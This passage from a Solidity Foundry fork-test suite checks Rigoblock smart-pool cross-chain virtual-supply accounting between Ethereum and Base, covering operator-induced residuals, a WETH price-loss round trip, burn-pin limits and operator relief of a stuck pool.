        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, reliefAmount, Constants.BASE_CHAIN_ID);
        assertEq(
            IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool),
            ethBalPre - reliefAmount,
            "relief funded entirely by the pool's own assets"
        );
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, reliefAmount);
        ChainState memory baseRelieved = _readChainState(base.pool);
        uint256 pinAfter = (uint256(-baseRelieved.vs) * 20 + 18) / 19;
        uint256 ratioRelieved = _claimsAssetsBps(base.pool);
        console2.log("UNSTICK pin before:", pinBefore);
        console2.log("UNSTICK pin after:", pinAfter);
        console2.log("UNSTICK coverage ratio after relief (bps):", ratioRelieved);
        assertGt(baseRelieved.vs, baseFinal.vs, "inbound Transfer relieved the residual");
        assertLt(baseRelieved.vs, 0, "relief does not overshoot into positive VS");
        assertLt(pinAfter, pinBefore, "burn pin on Base shrank");
        assertLt(ratioRelieved, ratioEnd, "coverage ratio moved toward 1");
    }

    /*//////////////////////////////////////////////////////////////////////////
        11. STABLECOIN-ONLY POOL, NO PRICE MOVE: OPERATOR DONATE CREATES THE RESIDUAL
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice The residual needs ONLY the originator's unitaryValue to change between its
    ///         outbound-initiation and return-arrival snapshots - a market price move is just
    ///         one way to do it. Here BOTH pools hold only USDC, NO oracle is mocked anywhere,
    ///         and every u starts pinned at par (1e6). A mid-window Sync donate on the
    ///         originator (Base) chain raises Base's u above par, so the return leg mints fewer
    ///         shares than the outbound leg burnt -> a NEGATIVE Base residual appears with zero
    ///         market movement. This is the operator-induced residual channel.
    ///         Control: test_Control_NoPriceMove_ZeroResidual runs the same static round trip
    ///         with no mid-window action and measures VS = exactly 0 on both chains; the exact
    ///         in-test counterfactual below reproduces that (0 by floor arithmetic).
    function test_StablecoinPool_MidWindowDonate_CreatesResidual() public {
        _deployPureUsdcScenario(BASE_EXTRA_MINT);

        vm.selectFork(baseForkId);
        uint256 nav0 = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        uint256 transferAmount = (nav0 * 20) / 100;

        // -- Step 1: outbound Base->Eth (Transfer mode); u must stay pinned at par on both chains ----
        _depositV3(base.pool, Constants.BASE_USDC, Constants.ETH_USDC, transferAmount, Constants.ETHEREUM_CHAIN_ID);
        assertEq(_readVS(base.pool), -int256(transferAmount), "Base: burnt1 == T exactly at u = 1e6");
        assertEq(_u(base.pool), 1e6, "Base u still pinned at par after the outbound leg");
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, transferAmount);
        assertEq(_readVS(ethereum.pool), int256(transferAmount), "Eth: minted1 == T exactly at u = 1e6");
        assertEq(_u(ethereum.pool), 1e6, "Eth u pinned at par after the arrival");

        // -- Step 2: NO oracle mocking anywhere - prices are static throughout ----

        // -- Step 3: mid-window operator Sync donate on the ORIGINATOR (Base) chain ----
        vm.selectFork(baseForkId);
        uint256 donateAmount = 100_000e6;
        _syncDonate(base.pool, Constants.BASE_USDC, donateAmount);
        uint256 uBaseRaised = _u(base.pool);
        assertGt(uBaseRaised, 1e6, "donate raised Base u above par (static prices, operator action only)");
        assertEq(_readVS(base.pool), -int256(transferAmount), "donate wrote no VS");

        // -- Step 4: return leg Eth->Base (Transfer mode, same T) ----
        vm.selectFork(mainnetForkId);
        _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, transferAmount, Constants.BASE_CHAIN_ID);
        vm.selectFork(baseForkId);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, transferAmount);
        vm.selectFork(mainnetForkId);
        int256 vsEthFinal = _readVS(ethereum.pool);
        vm.selectFork(baseForkId);
        int256 vsBaseFinal = _readVS(base.pool);

        // -- Step 5: the residual exists with ZERO market movement; the no-action control is 0 ----
        int256 residualNoAction = -int256(transferAmount) + int256(transferAmount); // u pinned: minted2 == burnt1 == T
        console2.log("residual Base WITH mid-window donate:", vsBaseFinal);
        console2.log("residual Base WITHOUT any action (control):", residualNoAction);
        console2.log("residual Eth WITH mid-window donate:", vsEthFinal);
        console2.log("donate size:", donateAmount);
        console2.log("Base u raised from 1e6 to:", uBaseRaised);
        assertEq(residualNoAction, 0, "control: static round trip with no action leaves VS exactly 0");
        assertLt(vsBaseFinal, 0, "operator donate alone CREATED a Base residual (no price move)");
        assertEq(vsEthFinal, 0, "Eth legs cancel exactly (its u never moved)");

        // -- Step 6: mints still work while the residual is in place ----
        uint256 tsBefore = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        deal(Constants.BASE_USDC, user, 10_000e6);
        uint256 uPreMint = _u(base.pool);
        vm.startPrank(user);
        IERC20(Constants.BASE_USDC).approve(base.pool, type(uint256).max);
        ISmartPool(payable(base.pool)).mint(user, 10_000e6, 0);
        vm.stopPrank();
        uint256 tsAfter = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        uint256 mintedExpected = (10_000e6 * 1e6) / uPreMint;
        assertApproxEqRel(
            tsAfter - tsBefore,
            mintedExpected,
            0.002e18,
            "mint succeeded and issued ~amount/u shares (0.1% transaction fee)"
        );
        assertEq(_readVS(base.pool), vsBaseFinal, "mint wrote no VS");
        console2.log("mint while residual in place: OK, issued shares:", tsAfter - tsBefore);
    }

    /// @notice Coverage ratio claims/assets in bps: claims = TS*u/1e6, assets = netTotalValue.
    ///         With negative VS this equals TS/ES (asset-invariant up to integer truncation).
    function _claimsAssetsBps(address pool) internal returns (uint256) {
        uint256 ts = ISmartPoolState(pool).getPoolTokens().totalSupply;
        uint256 u = _u(pool);
        uint256 assets = ISmartPoolActions(pool).updateUnitaryValue().netTotalValue;
        return (((ts * u) / 1e6) * 10_000) / assets;
    }

    struct BoundaryState {
        int256 vsV;
        uint256 uV;
        uint256 navV;
        uint256 tsV;
        int256 vsO;
        uint256 uO;
        uint256 navO;
        uint256 tsO;
    }

    function _readBoundaryState() internal returns (BoundaryState memory s) {
        vm.selectFork(baseForkId);
        s.vsV = _readVS(base.pool);
        s.uV = _u(base.pool);
        s.navV = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
        s.tsV = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        vm.selectFork(mainnetForkId);
        s.vsO = _readVS(ethereum.pool);
        s.uO = _u(ethereum.pool);
        s.navO = ISmartPoolActions(ethereum.pool).updateUnitaryValue().netTotalValue;
        s.tsO = ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply;
    }

    struct PinnedState {
        uint256 claims;
        uint256 nav;
    }

    function _readPinnedState() internal returns (PinnedState memory p) {
        uint256 u = _u(ethereum.pool);
        uint256 ts = ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply;
        p.claims = (ts * u) / 1e6;
        p.nav = ISmartPoolActions(ethereum.pool).updateUnitaryValue().netTotalValue;
    }

    /*//////////////////////////////////////////////////////////////////////////
        12. USER SCENARIO: FULL WETH BOOK TRANSFERRED OVER A -10% WETH LOSS
    //////////////////////////////////////////////////////////////////////////*/

    struct WethLossState {
        uint256 wethAmount; // full WETH balance transferred (18-dec, incl. activation dust)
        uint256 wethValue0; // WETH value in USDC at the outbound (pre-move) price
        uint256 wethValue1; // WETH value in USDC at the -10% (mocked) price
        uint256 burnt1; // share-equivalent written to Base VS by the outbound (raw)
        uint256 minted1; // share-equivalent written to Eth VS by the arrival (raw)
        uint256 syncAmount; // equalizing Sync Base->Eth (0 in the no-sync variant)
        uint256 parityGapBps; // u Base vs Eth gap after the sync (bps)
        uint256 minted2; // share-equivalent written to Base VS by the return arrival (raw)
        uint256 burnt2; // share-equivalent written off Eth VS by the return source leg (raw)
        uint256 uBasePreMove;
        uint256 uEthPreMove;
        uint256 uBasePostMove;
        uint256 uEthPostMove;
        uint256 uBasePreReturn; // Base u at the return-arrival snapshot
        address sinkPool; // sacrificial sync-out sink on the Eth fork
        ChainState baseFinal;
        ChainState ethFinal;
        uint256 coverageBaseBps; // claims/assets
        uint256 coverageEthBps;
        uint256 pinBase; // ceil(20|VS|/19) raw
        uint256 maxBurnableBase; // TS - pin raw
    }

    /// @notice Build the user's scenario substrate: pure-USDC pools, then a ~50/50 WETH book on the
    ///         ORIGINATOR (Base) with unitaryValue pinned at par, main Eth pool pristine at par.
    /// @dev A bare `deal` of WETH ADDS value (u would jump to ~1.5e6), so to honor the scenario's
    ///      core premise - u pinned at par - the WETH arrival is paired with a NAV-neutral Sync-out
    ///      of an equal USDC value to a sacrificial sink pool created on the Eth fork. No swap
    ///      adapter is wired in RealDeploymentFixture; the Sync-out is the documented proxy for a
    ///      real USDC->WETH conversion: it is NAV-neutral for everything the VS math consumes (no
    ///      share and no VS write on either leg, only the token mix changes). WETH is activated
    ///      with a dust Sync donate (~$3) so dealt WETH counts in NAV and can be spent by depositV3.
    /// @return wethAmount The pool's FULL WETH balance after activation dust (transferred later).
    /// @return sinkPool The sacrificial pool receiving the construction sync-outs.
    function _deployWethLossBook() internal returns (uint256 wethAmount, address sinkPool) {
        _deployPureUsdcScenario(WETH_LOSS_EXTRA_MINT);
        return _buildWethLossBook();
    }

    /// @notice The book construction half of _deployWethLossBook, callable on an already-deployed
    ///         pure-USDC scenario so callers can install oracle mocks BEFORE the WETH is priced
    ///         (the single-supply par control needs both legs pinned at the identical price).
    function _buildWethLossBook() internal returns (uint256 wethAmount, address sinkPool) {
        vm.selectFork(baseForkId);
        _syncDonate(base.pool, Constants.BASE_WETH, DUST_WETH);
        wethAmount = _wethAmountFor(base.pool, Constants.BASE_WETH, Constants.BASE_USDC, WETH_BOOK_TARGET);
        deal(Constants.BASE_WETH, base.pool, wethAmount);
        wethAmount = IERC20(Constants.BASE_WETH).balanceOf(base.pool); // include the activation dust

        // sacrificial sink pool on the Eth fork receives the NAV-neutral sync-out
        vm.selectFork(mainnetForkId);
        vm.prank(poolOwner);
        (sinkPool, ) = IRigoblockPoolProxyFactory(Constants.FACTORY).createPool("VsSink", "VSINK", Constants.ETH_USDC);

        // sync out an equal USDC value in navTolerance-sized chunks (Sync: no VS, no shares)
        uint256 remaining = WETH_BOOK_TARGET;
        uint256 guard;
        while (remaining > 0) {
            require(++guard < 30, "book construction did not converge");
            vm.selectFork(baseForkId);
            uint256 nav = ISmartPoolActions(base.pool).updateUnitaryValue().netTotalValue;
            uint256 chunk = (nav * TOLERANCE_BPS) / 10_000;
            if (chunk > remaining) chunk = remaining;
            _depositV3(
                base.pool,
                Constants.BASE_USDC,
                Constants.ETH_USDC,
                chunk,
                Constants.ETHEREUM_CHAIN_ID,
                OpType.Sync
            );
            vm.selectFork(mainnetForkId);
            _simulateFill(sinkPool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_USDC, chunk, OpType.Sync);
            remaining -= chunk;
        }

        // end state: Base ~50/50 book pinned at par, VS untouched on both chains, Eth pristine
        vm.selectFork(baseForkId);
        assertEq(_readVS(base.pool), 0, "construction wrote no VS on Base");
        assertApproxEqAbs(_u(base.pool), 1e6, 200, "Base u pinned at par after NAV-neutral construction");
        assertApproxEqRel(
            IERC20(Constants.BASE_USDC).balanceOf(base.pool),
            WETH_BOOK_TARGET,
            0.02e18,
            "Base holds ~750k USDC (50% of the book)"
        );
        vm.selectFork(mainnetForkId);
        assertEq(_readVS(ethereum.pool), 0, "construction wrote no VS on Eth");
        assertEq(_u(ethereum.pool), 1e6, "Eth u pinned at par (pristine)");
    }

    /// @notice Steps 1-5 of the user's scenario, fresh fixture per call: 50/50 book on Base, outbound
    ///         Transfer of ALL WETH to Eth, -10% WETH move on both oracles, optional exact equalizing
    ///         Sync (Base->Eth), return leg of the full WETH balance, full measurements.
    /// @dev Returns with the Base fork selected. Includes the burn-pin boundary check (+1 share
    ///      beyond maxBurnable reverts EffectiveSupplyTooLow) for both variants.
    function _runWethLoss(bool withSync) internal returns (WethLossState memory s) {
        (s.wethAmount, s.sinkPool) = _deployWethLossBook();

        // -- Step 1/2: outbound Transfer of the FULL WETH balance (Base -> Eth) --
        vm.selectFork(baseForkId);
        uint256 tsBase0 = ISmartPoolState(base.pool).getPoolTokens().totalSupply;
        s.wethValue0 = uint256(
            IEOracle(base.pool).convertTokenAmount(Constants.BASE_WETH, int256(s.wethAmount), Constants.BASE_USDC)
        );
        assertApproxEqRel(s.wethValue0, WETH_BOOK_TARGET, 0.01e18, "step 1: ~50/50 book, WETH half worth ~750k");
        assertApproxEqAbs(_u(base.pool), 1e6, 200, "step 1: u_Base pinned at par with the 50/50 book");

        _depositV3(base.pool, Constants.BASE_WETH, Constants.ETH_WETH, s.wethAmount, Constants.ETHEREUM_CHAIN_ID);
        s.burnt1 = uint256(-_readVS(base.pool));
        assertApproxEqRel(s.burnt1, s.wethValue0, 0.0002e18, "step 2: Base VS == -(WETH value)/par");
        assertTrue(20 * s.burnt1 <= 19 * tsBase0, "step 2: validateSupply cap (19/20) respected");
        assertApproxEqRel(s.burnt1, tsBase0 / 2, 0.02e18, "step 2: outbound ~= HALF of total supply (not ES)");
        assertEq(IERC20(Constants.BASE_WETH).balanceOf(base.pool), 0, "step 2: Base holds only USDC now");
        s.uBasePreMove = _u(base.pool);
        assertApproxEqAbs(s.uBasePreMove, 1e6, 200, "step 2: Base u still pinned after the outbound");

        // -- Step 3: arrival on Eth (all Eth effective supply, virtual included, now holds the WETH) --
        vm.selectFork(mainnetForkId);
        _simulateFill(ethereum.pool, Constants.ETH_MULTICALL_HANDLER, Constants.ETH_WETH, s.wethAmount);
        s.minted1 = uint256(_readVS(ethereum.pool));
        assertGt(s.minted1, 0, "step 3: Eth VS positive");
        s.uEthPreMove = _u(ethereum.pool);
        assertEq(s.uEthPreMove, 1e6, "step 3: Eth u pinned at par at arrival");

        // -- Step 4: WETH -10% on BOTH oracles (Base holds no WETH: NAV unaffected either way) --
        _installUsdcFeedMock(Constants.ORACLE, Constants.ETH_USDC, -TICKS_10PCT);
        vm.selectFork(baseForkId);
        _installUsdcFeedMock(Constants.BASE_ORACLE, Constants.BASE_USDC, -TICKS_10PCT);
        s.wethValue1 = uint256(
            IEOracle(base.pool).convertTokenAmount(Constants.BASE_WETH, int256(s.wethAmount), Constants.BASE_USDC)
        );
        assertLt(s.wethValue1, s.wethValue0, "step 4: WETH repriced down on the mocked feed");
        s.uBasePostMove = _u(base.pool);
        assertEq(s.uBasePostMove, s.uBasePreMove, "step 4: u_Base unchanged (holds no WETH)");
        vm.selectFork(mainnetForkId);
        s.uEthPostMove = _u(ethereum.pool);
        assertLt(s.uEthPostMove, 1e6, "step 4: u_Eth < par - all Eth supply took the loss");

        // -- Step 5b (optional): the exact equalizing Sync, computed from measured on-chain state --
        if (withSync) {
            // read Base state on the Base fork FIRST (identical pool addresses on both forks)
            vm.selectFork(baseForkId);
            ChainState memory csB = _readChainState(base.pool);
            vm.selectFork(mainnetForkId);
            ChainState memory csE = _readChainState(ethereum.pool);
            int256 esB = int256(csB.ts) + csB.vs;
            int256 esE = int256(csE.ts) + csE.vs;
            // parity: (V_B - d)/ES_B == (V_E + d)/ES_E -> d = (V_B*ES_E - V_E*ES_B)/(ES_B + ES_E)
            int256 delta = (int256(csB.v) * esE - int256(csE.v) * esB) / (esB + esE);
            assertGt(delta, 0, "step 5b: sign verified - the equalizing Sync flows Base->Eth (loss is on Eth)");
            s.syncAmount = uint256(delta);

            vm.selectFork(baseForkId);
            assertLt(s.syncAmount, IERC20(Constants.BASE_USDC).balanceOf(base.pool), "delta payable by Base");
            _depositV3(
                base.pool,
                Constants.BASE_USDC,
                Constants.ETH_USDC,
                s.syncAmount,
                Constants.ETHEREUM_CHAIN_ID,
                OpType.Sync
            );
            assertEq(_readVS(base.pool), csB.vs, "step 5b: sync wrote no VS on Base");
            uint256 uBaseSynced = _u(base.pool);
            assertLt(
                uBaseSynced,
                s.uBasePreMove - 1000,
                "step 5b: sync drained Base NAV with no VS write - u_Base now BELOW par (the mechanism)"
            );
            vm.selectFork(mainnetForkId);
            _simulateFill(
                ethereum.pool,
                Constants.ETH_MULTICALL_HANDLER,
                Constants.ETH_USDC,
                s.syncAmount,
                OpType.Sync
            );
            assertEq(_readVS(ethereum.pool), csE.vs, "step 5b: sync arrival wrote no VS on Eth");
            s.parityGapBps = _bpsGap(uBaseSynced, _u(ethereum.pool));
            assertApproxEqRel(uBaseSynced, _u(ethereum.pool), 0.001e18, "step 5b: equalizing sync restored NAV parity");
        }

        // -- Return leg: Eth sends the (devalued) WETH back to Base --
        vm.selectFork(baseForkId);
        s.uBasePreReturn = _u(base.pool); // the arrival-time snapshot u (stored unitaryValue)
        vm.selectFork(mainnetForkId);
        int256 vsEthBefore = _readVS(ethereum.pool);
        _depositV3(ethereum.pool, Constants.ETH_WETH, Constants.BASE_WETH, s.wethAmount, Constants.BASE_CHAIN_ID);
        s.burnt2 = uint256(vsEthBefore - _readVS(ethereum.pool));
        vm.selectFork(baseForkId);
        int256 vsBaseBefore = _readVS(base.pool);
        _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_WETH, s.wethAmount);
        s.minted2 = uint256(_readVS(base.pool) - vsBaseBefore);

        // -- Measure finals (Base first: identical pool addresses on both forks) --
        s.baseFinal = _readChainState(base.pool);
        s.coverageBaseBps = _claimsAssetsBps(base.pool);
        vm.selectFork(mainnetForkId);
        s.ethFinal = _readChainState(ethereum.pool);
        s.coverageEthBps = _claimsAssetsBps(ethereum.pool);

        // exact identity + the user's corrected law (par-pinned snapshots only): residual = -(V0 - V1)/par
        assertEq(s.baseFinal.vs, -int256(s.burnt1) + int256(s.minted2), "Base VS = -burnt1 + minted2 (exact)");
        if (!withSync) {
            assertApproxEqRel(
                uint256(-s.baseFinal.vs),
                s.wethValue0 - s.wethValue1,
                0.001e18,
                "residual magnitude == the WETH loss (V0 - V1) at par"
            );
        }

        // burn pin on Base (+1 share beyond maxBurnable reverts)
        uint256 vsAbs = uint256(-s.baseFinal.vs);
        s.pinBase = (vsAbs * 20 + 18) / 19; // ceil(20|VS|/19)
        assertTrue(19 * s.pinBase >= 20 * vsAbs && 19 * (s.pinBase - 1) < 20 * vsAbs, "pin is exact");
        s.maxBurnableBase = s.baseFinal.ts - s.pinBase;
        vm.selectFork(baseForkId);
        vm.prank(user);
        vm.expectRevert(NavImpactLib.EffectiveSupplyTooLow.selector);
        ISmartPoolActions(base.pool).burn(s.maxBurnableBase + 1, 0);
    }

    function _logWethLoss(string memory name, WethLossState memory s) internal view {
        console2.log("==== ", name);
        console2.log("  WETH full balance (18-dec):", s.wethAmount);
        console2.log("  WETH value USDC: pre-move / post-move:", s.wethValue0, s.wethValue1);
        console2.log("  legs: burnt1 (Base outbound):", s.burnt1);
        console2.log("  legs: minted1 (Eth arrival):", s.minted1);
        console2.log("  sync amount Base->Eth (0 = none):", s.syncAmount);
        console2.log("  parity gap after sync (bps):", s.parityGapBps);
        console2.log("  u Base pre/post move:", s.uBasePreMove, s.uBasePostMove);
        console2.log("  u Eth  pre/post move:", s.uEthPreMove, s.uEthPostMove);
        console2.log("  u Base at return snapshot:", s.uBasePreReturn);
        console2.log("  legs: burnt2 (Eth return):", s.burnt2);
        console2.log("  legs: minted2 (Base arrival):", s.minted2);
        console2.log("  residual Base (raw):", s.baseFinal.vs);
        console2.log("  residual Eth  (raw):", s.ethFinal.vs);
        console2.log("  coverage Base (bps):", s.coverageBaseBps);
        console2.log("  coverage Eth  (bps):", s.coverageEthBps);
        console2.log("  Base TS:", s.baseFinal.ts);
        console2.log("  Base pin (raw):", s.pinBase);
        console2.log("  Base maxBurnable (raw):", s.maxBurnableBase);
    }

    /// @notice THE USER'S SCENARIO, both variants measured: the originator (Base) holds a ~50/50
    ///         WETH book with u pinned at par, Transfers ALL its WETH to Eth, WETH drops ~10% while
    ///         it lives there, then returns. Variant 5a: no sync before the return. Variant 5b: the
    ///         exact equalizing Sync (Base->Eth, sign verified) after the move.
    ///
    ///         Verified (user-corrected law): with the originator's u pinned at par, Base's residual
    ///         = -(V0 - V1)/par = EXACTLY the loss, negative: Base over-claims (phantom NAV) and a
    ///         burn pin appears; Eth strands a small positive VS.
    ///
    ///         The sync is NOT immaterial to Base (the "immutable" prediction is falsified): the
    ///         Sync drains Base's NAV with NO VS write, so u_Base drops BELOW par at the return
    ///         snapshot, minted2 = V1/u_Base' grows, and Base's negative residual SHRINKS - while
    ///         Eth's positive residual grows by the same amount. The sync shifts part of the loss
    ///         back onto the originator; Base still over-claims and stays pinned.
    function test_UserScenario_WethLoss_OriginatorPinned() public {
        // ---- variant 5a: NO sync before the return ----
        WethLossState memory noSync = _runWethLoss(false);
        _logWethLoss("A-5a NO-SYNC (return over the loss)", noSync);

        assertLt(noSync.baseFinal.vs, 0, "5a: Base residual NEGATIVE - the loss, share-denominated");
        assertGt(noSync.ethFinal.vs, 0, "5a: Eth residual small positive");
        assertApproxEqRel(
            noSync.minted2,
            (noSync.wethValue1 * 1e6) / noSync.uBasePreReturn,
            0.001e18,
            "5a: minted2 == V1/u at the pinned-par snapshot (exactly value-neutral return)"
        );
        assertGt(noSync.coverageBaseBps, 10_000, "5a: Base over-claims (phantom NAV)");
        assertLt(noSync.coverageEthBps, 10_000, "5a: Eth under-claims");
        assertGt(noSync.pinBase, 0, "5a: burn pin exists on Base");

        // ---- variant 5b: exact equalizing Sync (Base->Eth) after the loss, then the return ----
        WethLossState memory synced = _runWethLoss(true);
        _logWethLoss("A-5b EQUALIZING SYNC (Base->Eth) THEN RETURN", synced);

        assertLt(synced.baseFinal.vs, 0, "5b: Base residual still NEGATIVE after the sync");
        assertGt(synced.baseFinal.vs, noSync.baseFinal.vs, "5b: the sync SHRANK Base's negative residual");
        assertLt(
            uint256(-synced.baseFinal.vs),
            uint256(-noSync.baseFinal.vs),
            "5b: |Base residual| is smaller with the sync"
        );
        assertLt(synced.uBasePreReturn, noSync.uBasePreReturn, "5b: mechanism - sync pushed u_Base below par");
        assertGt(synced.minted2, noSync.minted2, "5b: mechanism - lower snapshot u minted MORE +VS on return");
        assertGt(synced.ethFinal.vs, noSync.ethFinal.vs, "5b: Eth's positive residual grew by the same shift");
        assertApproxEqRel(
            uint256(-synced.baseFinal.vs),
            uint256(synced.ethFinal.vs),
            0.05e18,
            "5b: residuals ~mirror images (equal snapshot u; only L1/L2 WETH feed basis differs)"
        );
        assertGt(synced.coverageBaseBps, 10_000, "5b: Base still over-claims - the pin survives the sync");
    }

    /// @notice Definitive answer: the last-holder DOS is NOT permanent. On the stuck state from
    ///         Test A variant 5a (Base pinned with negative VS): (1) the pin is asserted - burning
    ///         maxBurnable + 1 share reverts EffectiveSupplyTooLow (already checked in the runner);
    ///         (2) the operator relieves the pin with inbound Transfers sized EXACTLY from on-chain
    ///         state (v = ceil(|VS|*u/1e6) - one iteration lands VS at EXACTLY 0, no refinement
    ///         needed); (3) EVERYTHING burns - the full supply to TS = 0 with no revert; (4) the
    ///         strand is rounding dust only, and the relief was funded by the pool's OWN
    ///         cross-chain assets (the Eth pool's USDC wallet), no external money.
    function test_StuckToFullyBurnable_OperatorUnstick() public {
        WethLossState memory s = _runWethLoss(false);
        _logWethLoss("B STUCK STATE (Test A variant 5a)", s);
        vm.selectFork(baseForkId);
        assertLt(_readVS(base.pool), 0, "stuck: negative VS on Base");

        // --- 2. operator relief, exactly sized from on-chain state (one iteration) ---
        uint256 iterations;
        while (_readVS(base.pool) < 0) {
            require(++iterations <= 3, "relief did not converge in 3 iterations");
            uint256 vsAbs = uint256(-_readVS(base.pool));
            uint256 uNow = _u(base.pool); // >= par: the stored unitaryValue used at the arrival snapshot
            uint256 v = (vsAbs * uNow + 1e6 - 1) / 1e6; // ceil(|VS|*u/1e6)
            console2.log("relief iteration:", iterations);
            console2.log("  |VS| (raw):", vsAbs);
            console2.log("  u snapshot:", uNow);
            console2.log("  relief value v (USDC 6-dec):", v);

            vm.selectFork(mainnetForkId);
            uint256 ethBalPre = IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool);
            uint256 ownerBalPre = IERC20(Constants.ETH_USDC).balanceOf(poolOwner);
            uint256 userBalPre = IERC20(Constants.ETH_USDC).balanceOf(user);
            _depositV3(ethereum.pool, Constants.ETH_USDC, Constants.BASE_USDC, v, Constants.BASE_CHAIN_ID);
            // funded by the pool's own cross-chain wallet: the pool paid, the operator only signed.
            // (_depositV3 vestigially deals v to the operator to set up the approval; the assert
            // proves none of it was spent - the transfer pulled exclusively from the pool wallet.)
            assertEq(
                IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool),
                ethBalPre - v,
                "relief paid from the pool's own USDC wallet"
            );
            assertEq(IERC20(Constants.ETH_USDC).balanceOf(poolOwner), v, "operator supplied no funds");
            assertEq(IERC20(Constants.ETH_USDC).balanceOf(user), userBalPre, "user balance untouched");
            vm.selectFork(baseForkId);
            _simulateFill(base.pool, Constants.BASE_MULTICALL_HANDLER, Constants.BASE_USDC, v);
        }
        assertEq(iterations, 1, "one exactly-sized relief iteration suffices");
        assertEq(_readVS(base.pool), 0, "VS driven to EXACTLY 0 - no remainder");
        assertApproxEqAbs(_claimsAssetsBps(base.pool), 10_000, 20, "claims == assets after relief (pin gone)");

        // --- 3. burn EVERYTHING ---
        _burnDownTo(base.pool, Constants.BASE_USDC, Constants.BASE_WETH, 0);
        assertEq(ISmartPoolState(base.pool).getPoolTokens().totalSupply, 0, "100% of the supply burned");

        // --- 4. the strand: rounding dust only ---
        uint256 strandedUsdc = IERC20(Constants.BASE_USDC).balanceOf(base.pool);
        uint256 strandedWeth = IERC20(Constants.BASE_WETH).balanceOf(base.pool);
        console2.log("final stranded USDC (raw 6-dec):", strandedUsdc);
        console2.log("final stranded WETH (raw 18-dec):", strandedWeth);
        assertLt(strandedUsdc, 1e6, "strand < 1 USDC (rounding dust only)");
        assertLt(strandedWeth, 1e12, "strand < 0.000001 WETH (rounding dust only)");

        // --- 5. NAV-closure identity on Eth too (assets - claims == VS*u/1e6, per chain) ---
        vm.selectFork(mainnetForkId);
        {
            (int256 gapE, uint256 esE) = _navClosureGap(ethereum.pool);
            console2.log("Eth NAV-closure gap (raw):", gapE);
            console2.log("Eth effective supply (raw):", esE);
            assertTrue(gapE >= 0 && uint256(gapE) <= esE / 1e6 + 2, "Eth closure gap within the u-flooring bound");
        }
    }

    /*//////////////////////////////////////////////////////////////////////////
        14. SINGLE-SUPPLY CHAIN GEOMETRY: THE WHOLE BOOK CROSSES TO AN EMPTIED POOL
    //////////////////////////////////////////////////////////////////////////*/

    /// @notice Foundry snapshots are PER-FORK and ONE-SHOT (a reverted snapshot is deleted), so a
    ///         two-fork scenario needs a pair, re-taken after every revert.
    struct ForkSnapshot {
        uint256 mainnet;
        uint256 base;
    }

    function _snapshotBoth() internal returns (ForkSnapshot memory fs) {
        vm.selectFork(mainnetForkId);
        fs.mainnet = vm.snapshot();
        vm.selectFork(baseForkId);
        fs.base = vm.snapshot();
    }

    function _revertBoth(ForkSnapshot memory fs) internal {
        vm.selectFork(mainnetForkId);
        assertTrue(vm.revertTo(fs.mainnet), "revert the mainnet fork");
        vm.selectFork(baseForkId);
        assertTrue(vm.revertTo(fs.base), "revert the Base fork");
    }

    struct SingleSupplyVariant {
        int24 ticks; // signed oracle move applied between the legs (+gain / -loss)
        bool withSync; // exact equalizing Sync executed after the move
        uint256 syncAmount; // equalizing value transferred (0 = no sync)
        bool syncEthToBase; // direction law: gain -> Eth sends WETH to Base; loss -> Base sends USDC
        uint256 parityGapBps; // u Base vs Eth gap after the sync
        bool returnSucceeded; // full-WETH return leg from the emptied Eth pool
        bytes returnError; // revert payload when the return leg fails
        int256 ethVSPreReturn; // Eth VS before the return attempt
        uint256 ethWethPreReturn; // Eth WETH wallet before the return attempt
        int256 baseVSFinal;
        uint256 baseNavFinal;
        uint256 baseUFinal;
        uint256 baseClosureGap; // NAV-closure identity gap (raw)
        int256 ethVSFinal;
        uint256 ethWethFinal;
        uint256 ethUFinal;
        uint256 ethClosureGap; // NAV-closure identity gap (raw)
    }

    /// @notice NAV-closure identity gap for one pool: (assets - claims) - VS*u/1e6, in raw base units.
    /// @dev Exact arithmetic gives 0; u floors below V/ES, so the gap lands in [0, ES/1e6) (+/- 1 raw).
    function _navClosureGap(address pool) internal returns (int256 gap, uint256 es) {
        ChainState memory c = _readChainState(pool);
        es = uint256(int256(c.ts) + c.vs);
        int256 claims = int256((c.ts * c.u) / 1e6);
        int256 virtualClaims = (c.vs * int256(c.u)) / 1e6;
        gap = int256(c.v) - claims - virtualClaims;
    }

    /// @notice Assert the NAV-closure identity for one pool and return the gap.
    function _assertNavClosure(address pool, string memory errPrefix) internal returns (uint256 gap, uint256 es) {
        int256 g;
        (g, es) = _navClosureGap(pool);
        gap = uint256(g);
        assertTrue(g >= 0, string.concat(errPrefix, ": closure gap >= 0"));
        assertLe(gap, es / 1e6 + 2, string.concat(errPrefix, ": closure gap within the u-flooring bound"));
    }

    /// @notice Burn EVERY share of the Eth fixture pool (user + owner): the emptied destination.
    function _emptyEthPool() internal {
        vm.selectFork(mainnetForkId);
        uint256 bal = ISmartPoolState(ethereum.pool).balanceOf(user);
        vm.prank(user);
        ISmartPoolActions(ethereum.pool).burn(bal, 0);
        uint256 ownerBal = ISmartPoolState(ethereum.pool).balanceOf(poolOwner);
        if (ownerBal > 0) {
            vm.prank(poolOwner);
            ISmartPoolActions(ethereum.pool).burn(ownerBal, 0);
        }
        assertEq(ISmartPoolState(ethereum.pool).getPoolTokens().totalSupply, 0, "emptied Eth: TS == 0");
        assertEq(IERC20(Constants.ETH_USDC).balanceOf(ethereum.pool), 0, "emptied Eth: no USDC left");
